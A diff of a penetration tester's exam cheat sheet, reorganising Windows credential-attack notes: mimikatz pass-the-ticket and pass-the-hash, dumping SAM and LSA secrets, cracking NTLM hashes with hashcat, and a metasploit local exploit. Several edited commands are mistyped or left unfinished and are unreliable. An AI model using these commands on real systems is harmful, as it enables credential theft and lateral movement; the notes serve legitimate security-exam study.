@@ -1468,18 +1468,6 @@ ps> klist
 psexec.exe -accepteula \\<remote_hostname> cmd  
 ```
 
-### Pass the ticket
-```bash
-.\mimikatz.exe
-sekurlsa::tickets /export
-
-#obtain the newly generated ticket (latest timestamp)
-dir *.kirbi
-mimikatz # kerberos::ptt *[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi*
-klist
-dir \\web04\admin$
-```
-
 ## EvilWinRM (install before exam, do a snapshot before installing)
 - Gives persistent shell. Crackmapexec doesnt.
 - Installation: `gem install evil-winrm`
@@ -1733,27 +1721,36 @@ impacket-secretsdump -just-dc-user *targetuser* corp.com/jeffadmin:"BrouhahaTung
 2. for each vulnerabilities suggested, run metasploit payload to obtain Reverse shell: `use exploit/windows/local/ms10_015_kitrap0d`
 3. repeat thru the listed of suggested exploits and try until success
 
-# 78
-use hfs.exe to host file in windows for transfer to Linux
-use samdump2 to decrypt SAM... `samdump2 system sam` -> copy and paste the hashes to notepad -> `hashcat -m 1000 -a 3 hashes.txt rockyou.txt`
-- SAM stores NTLM
+# Crack SAM (NTLM hash) and SYSTEM
+1. On Windows, run hfs.exe to transfer SAM and SYSTEM to Kali (drag and drop)
+2. On Kali, `wget http://192.168.1.55/sam` and `wget http://192.168.1.55/system`
+3. Use samdump2 to decrypt SAM. `samdump2 system sam`
+4. Copy and paste the hashes from (3) to notepad: `hashcat -m 1000 -a 3 hashes.txt rockyou.txt`
+5. Note: -m specifies the hash type to decrypt e.g. 1000 = NTLM
 
+# Dump SAM (NTLM) and LSA using mimikatz
+1. needs to be admin to run mimikatz
+2. `powershell -ep bypass`
+3. `import-module .\invoke-mimikatz.ps1`
+4. `Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'`
 
-# 79 
-dump SAM and LSA usingmimikatz
-needs to be admin to run mimikatz
-powershell -ep bypass
-import-module .\invoke-mimikatz.ps1
-Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"'
+**# 80. pass the hash using mimikatz
+1. `powershell -ep bypass`
+2. import-module .\invoke-mimikatz.ps1`
+3. `Invoke-Mimikatz -Command '"sekurlsa::pth /user:stdent5 /domain:pentesting/ntlm:369def79d8372408bf6e93364cc93075 /run:powershell.exe"'`
+4. Wait for 
+5. Note for PTH, hash is valid only until the user change the password -> use RC4, while pass the ticket is only valid for a few hours.
+6. Note: Kerberos is using AES256**
 
-# 80. pass the hash using mimikatz
-powershell -ep bypass
-import-module .\invoke-mimikatz.ps1
-Invoke-Mimikatz -Command '"sekurlsa::pth /user:stdent5 /domain:pentesting /ntlm:369def79d8372408bf6e93364cc93075 /run:powershell.exe"'
+**### Pass the ticket 1
+1. `.\mimikatz.exe` or `import-module .\invoke-mimikatz.ps1`
+2. Export .kirbi file (with latest timestamp) to the working directory folder: `export Kirsekurlsa::tickets /export` or `Invoke-Mimikatz -Command '"Mimikatz::debug" "sekurlsa::tickets /export" "exit"'`
+3. Finds the newly exported file int he working directory folder: `dir *.kirbi`
+4. Pass the ticket: `mimikatz # kerberos::ptt *[0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi*` or `invoke-mimikatz -Command '"Mimikatz::debug "kerberos::ptt [0;12bd0]-0-0-40810000-dave@cifs-web04.kirbi" "exit"'
+5. To list and show all the tickets that you have: `klist`**
 
-passthehash= hash is valid only until the user change the password -> use RC4
-pass the ticket only valid for a few hours
-Kerberos -> AES256
+### Pass the ticket 2
+1. Use Rubeus instead of mimikatz
 
 
 # MISC
